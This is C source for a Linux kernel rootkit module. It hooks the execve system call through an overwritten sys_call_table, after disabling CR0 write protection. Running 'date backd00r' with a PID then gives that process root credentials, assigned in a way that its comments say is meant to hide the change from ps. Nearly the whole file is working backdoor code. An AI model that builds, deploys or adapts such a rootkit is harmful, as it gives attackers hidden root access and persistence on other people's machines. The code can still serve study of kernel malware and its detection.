#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/kallsyms.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Vincent Kob");
MODULE_DESCRIPTION("Hooks the execve syscall and matches 'date backd00r [PID]' to elevate PID to root");


typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs*);

static sys_call_ptr_t *sys_call_table;
static sys_call_ptr_t old_execve;


struct task_struct *get_task_struct_by_pid(unsigned pid)
{
    struct pid *proc_pid = find_vpid(pid);
    struct task_struct *task;

    if(!proc_pid)
        return 0;
    
    task = pid_task(proc_pid, PIDTYPE_PID);
    return task;
}

static int make_pid_root(unsigned pid)
{
    struct task_struct *task;
    struct cred *new_cred;

    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);

    task = get_task_struct_by_pid(pid);
    if (task == NULL){
      printk("Failed to get current task info.\n");
      return -1;
    }

    new_cred = prepare_creds();
    if (new_cred == NULL) {
      printk("Failed to prepare new credentials\n");
      return -ENOMEM;
    }
    new_cred->uid = kuid;
    new_cred->gid = kgid;
    new_cred->euid = kuid;
    new_cred->egid = kgid;

    // Dirty creds assignment so "ps" doesn't show the root uid!
    // If one uses commit_creds(new_cred), not only this would only affect 
    // the current calling task but would also display the new uid (more visible).
    // rcu_assign_pointer is taken from the commit_creds source code (kernel/cred.c)
    rcu_assign_pointer(task->cred, new_cred);
    return 0;
}


static asmlinkage long my_execve(const struct pt_regs *regs)
{
    // "->di" coming from: arch/x86/entry/calling.h
    //strcpy((char*)regs->di, text);
    if(strstr((char*)regs->di, "date"))
    {
        char** args = (char**)regs->si;

        if(args[1] != NULL && strcmp(args[1], "backd00r") == 0)
        {
            char* dummy;
            unsigned pid = (int)simple_strtol(args[2], &dummy, 10);

            printk("SECRET: making PID %i root!\n", pid);
            if (make_pid_root(pid) < 0)
                printk(KERN_ALERT "Failed to change PID credentials!\n");
        }
    }
    
    return old_execve(regs);
}


// coming from: arch/x86/kernel/cpu/common.c
//   > void native_write_cr0(unsigned long val)
inline void mywrite_cr0(unsigned long val)
{
    asm volatile("mov %0,%%cr0": "+r" (val), "+m" (__force_order));
}

static void enable_write_protection(void)
{
  unsigned long cr0 = read_cr0();
  set_bit(16, &cr0);
  mywrite_cr0(cr0);
}

static void disable_write_protection(void)
{
  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  mywrite_cr0(cr0);
}


static int __init syscall_rootkit_init(void)
{
    sys_call_table = (sys_call_ptr_t *)kallsyms_lookup_name("sys_call_table");
    old_execve = sys_call_table[__NR_execve];
    disable_write_protection();
    sys_call_table[__NR_execve] = my_execve;
    enable_write_protection();

    printk(KERN_INFO "All lights are green...\n");
    return 0;
}

static void __exit syscall_rootkit_exit(void)
{
    disable_write_protection();
    sys_call_table[__NR_execve] = old_execve;
    enable_write_protection();
}

module_init(syscall_rootkit_init);
module_exit(syscall_rootkit_exit);
